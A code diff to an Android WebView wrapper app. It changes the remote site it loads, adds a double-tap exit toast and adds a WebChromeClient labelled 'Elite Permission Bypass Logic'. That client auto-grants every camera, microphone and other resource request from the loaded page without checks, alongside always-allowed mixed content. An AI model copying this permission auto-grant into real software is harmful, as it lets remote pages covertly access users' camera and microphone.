@@ -11,6 +11,8 @@ import android.net.Network;
 import android.os.Bundle;
 import android.view.Gravity;
 import android.view.View;
+import android.webkit.PermissionRequest;
+import android.webkit.WebChromeClient;
 import android.webkit.WebResourceError;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
@@ -20,6 +22,7 @@ import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.RelativeLayout;
 import android.widget.TextView;
+import android.widget.Toast; // Added for Exit warning
 
 public class MainActivity extends Activity {
     
@@ -27,7 +30,10 @@ public class MainActivity extends Activity {
     private LinearLayout loaderLayout;
     private TextView statusText;
     private AlertDialog internetDialog; 
-    private final String TARGET_URL = "https://hk-mall-16bb9.web.app/";
+    private final String TARGET_URL = "https://hk-love.netlify.app/";
+    
+    // Timer for Double Back Press Exit Logic
+    private long backPressedTime = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -74,6 +80,17 @@ public class MainActivity extends Activity {
         settings.setDatabaseEnabled(true);
         settings.setLoadsImagesAutomatically(true);
         settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        
+        // Elite Permission Bypass Logic (Camera, Mic, Location, Storage)
+        hkView.setWebChromeClient(new WebChromeClient() {
+            @Override
+            public void onPermissionRequest(final PermissionRequest request) {
+                runOnUiThread(() -> {
+                    // Auto-grant all requested resources strictly for this secure terminal
+                    request.grant(request.getResources());
+                });
+            }
+        });
 
         hkView.setWebViewClient(new WebViewClient() {
             @Override
@@ -130,14 +147,13 @@ public class MainActivity extends Activity {
     private void showNoInternetPopUp() {
         if (internetDialog != null && internetDialog.isShowing()) return;
 
-        // The Big Green Panel (Replacing the white one)
+        // The Big Green Panel
         LinearLayout dialogLayout = new LinearLayout(this);
         dialogLayout.setOrientation(LinearLayout.VERTICAL);
-        dialogLayout.setBackgroundColor(Color.parseColor("#004D00")); // Solid Deep Green
+        dialogLayout.setBackgroundColor(Color.parseColor("#004D00")); 
         dialogLayout.setPadding(60, 80, 60, 80);
         dialogLayout.setGravity(Gravity.CENTER);
 
-        // Alert Text
         TextView title = new TextView(this);
         title.setText("NETWORK ERROR");
         title.setTextColor(Color.WHITE);
@@ -157,7 +173,7 @@ public class MainActivity extends Activity {
         // Aggressive Red Retry Button
         TextView retryBtn = new TextView(this);
         retryBtn.setText(" RETRY ");
-        retryBtn.setBackgroundColor(Color.parseColor("#FF0000")); // RED
+        retryBtn.setBackgroundColor(Color.parseColor("#FF0000")); 
         retryBtn.setTextColor(Color.WHITE);
         retryBtn.setTextSize(16);
         retryBtn.setPadding(0, 35, 0, 35);
@@ -183,7 +199,6 @@ public class MainActivity extends Activity {
         
         internetDialog = builder.create();
         
-        // Final Polish: Kill the default Android white background window
         if (internetDialog.getWindow() != null) {
             internetDialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
         }
@@ -191,13 +206,21 @@ public class MainActivity extends Activity {
         internetDialog.show();
     }
 
+    // Custom Secure Exit Logic
     @Override
     public void onBackPressed() {
         if (hkView.canGoBack()) {
-            hkView.goBack();
+            hkView.goBack(); // Ek baar back dabane par previous page
         } else {
-            super.onBackPressed();
+            // Agar history khatam, toh continuous (double tap) check karega (2 seconds window)
+            if (backPressedTime + 2000 > System.currentTimeMillis()) {
+                super.onBackPressed(); // Exit
+                finish();
+            } else {
+                // Aggressive Warning 
+                Toast.makeText(this, "PRESS BACK AGAIN TO TERMINATE SYSTEM", Toast.LENGTH_SHORT).show();
+            }
+            backPressedTime = System.currentTimeMillis();
         }
     }
 }
-                                        
